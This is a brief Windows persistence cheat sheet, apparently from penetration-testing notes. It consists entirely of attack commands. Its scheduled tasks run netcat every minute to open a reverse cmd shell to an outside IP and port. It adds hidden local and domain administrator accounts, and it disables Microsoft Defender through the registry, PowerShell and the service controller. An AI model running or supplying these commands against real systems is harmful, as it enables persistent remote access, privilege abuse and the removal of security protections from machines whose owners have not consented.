# Create task to call every minute to your machine
```bash
# Create general task
schtasks /create /tn "revtask" /sc minute /mo 1 /tr "C:\Users\Public\Documents\nc64.exe 192.168.45.168 4444 -e cmd"

# Create task for user
schtasks /create /tn "RevTask" /tr "cmd /c command-here" /sc minute /mo 1 /ru "Username" /rp "Password"

sc config schedule start= auto
net start schedule
at 13:30 ""C:\nc.exe <ip> 7777 -e cmd.exe""
```
-----------------------

# Create new user
```bash
# Local User
net user sombi Password /add
net localgroup Administrators sombi /add

net user sombi Password /domain /add
net group "Domain Admins" NewUser /add
```
-----------------------

# Disable Antivirus
```bash
-- REG Query
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

-- Powershell
# To disable it
Set-MpPreference -DisableRealtimeMonitoring $true

# To re-enable it
Set-MpPreference -DisableRealtimeMonitoring $false

-- Services
sc stop WinDefend
sc start WinDefend
```
